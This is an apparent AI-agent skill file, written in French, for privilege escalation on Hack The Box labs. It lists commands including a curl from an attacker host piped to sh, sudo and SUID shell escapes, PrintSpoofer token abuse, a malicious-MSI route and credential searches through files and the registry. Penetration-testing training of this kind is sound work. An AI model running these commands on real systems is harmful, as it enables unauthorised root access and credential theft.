---
name: htb-privesc
description: >
  Élévation de privilèges locale (Linux et Windows) sur une box HTB/lab autorisé.
  À déclencher dès qu'on a un shell utilisateur non privilégié et qu'on veut
  passer root/SYSTEM. Couvre : énumération automatisée (linpeas/winpeas, pspy,
  linux-exploit-suggester), vecteurs classiques (sudo, SUID, cron, capabilities,
  services et permissions Windows, tokens), et exploitation du vecteur trouvé.
  Produit un accès root (Linux) ou SYSTEM/Administrator (Windows) et le flag root.
metadata:
  type: reference
  category: privilege-escalation
  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
---

# HTB — Élévation de privilèges

## Quand utiliser cette skill
Vous avez un shell peu privilégié (`www-data`, un user standard) et cherchez
root/SYSTEM. Méthode : énumérer d'abord, exploiter ensuite le vecteur le plus net.

## Étape 0 — Énumération automatisée
```bash
# Transférer depuis /opt/PEASS-ng (voir htb-shells pour le transfert)
# Linux
curl http://$LHOST/linpeas.sh | sh          # ou déposer puis: ./linpeas.sh
pspy64                                        # processus/cron en temps réel
./linux-exploit-suggester.sh                  # exploits kernel candidats
```
```powershell
# Windows
.\winPEASx64.exe
whoami /priv ; whoami /groups
```

## LINUX — vecteurs classiques (dans l'ordre à tester)
```bash
# 1) sudo mal configuré  -> gtfobins.github.io
sudo -l
#   ex: (ALL) NOPASSWD: /usr/bin/find  ->  sudo find . -exec /bin/sh \; -quit

# 2) SUID binaries
find / -perm -4000 -type f 2>/dev/null
#   binaire inhabituel -> GTFOBins (SUID)

# 3) Capabilities
getcap -r / 2>/dev/null
#   cap_setuid+ep sur python/perl -> setuid(0)

# 4) Cron jobs (scripts world-writable exécutés par root) -> voir pspy
cat /etc/crontab ; ls -la /etc/cron.*

# 5) Fichiers sensibles / creds
ls -la /home/*/.ssh/ ; find / -name "*.kdbx" 2>/dev/null
grep -rIn "password" /var/www 2>/dev/null

# 6) Kernel exploit (dernier recours) -> linux-exploit-suggester
```
Réflexes : `sudo -l` et SUID + GTFOBins résolvent une grande partie des box.

## WINDOWS — vecteurs classiques
```powershell
# 1) Privilèges de token
whoami /priv
#   SeImpersonate/SeAssignPrimaryToken -> PrintSpoofer / GodPotato / JuicyPotato
.\PrintSpoofer64.exe -i -c cmd

# 2) Services : chemins non quotés, binaires modifiables, autostart faible
#   (winPEAS les surligne) -> remplacer le binaire ou reconfigurer le service

# 3) AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#   si les deux =1 -> msiexec d'un .msi malveillant

# 4) Creds stockés
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
#   fichiers unattend.xml, web.config, Groups.xml (GPP)

# 5) Historique / fichiers utilisateur, tâches planifiées
```

## Réflexes transverses
- Comparer la sortie PEAS aux vecteurs ci-dessus : viser le plus fiable d'abord.
- Toujours revérifier le **password reuse** (mot de passe root réutilisé ailleurs).
- Sur AD, l'escalade peut être *domaine* et non locale → repasser sur `htb-active-directory`.
- Ne pas lancer un exploit kernel destructeur si un vecteur propre existe.

## Fin de box
```bash
cat /root/root.txt           # Linux
type C:\Users\Administrator\Desktop\root.txt   # Windows
```
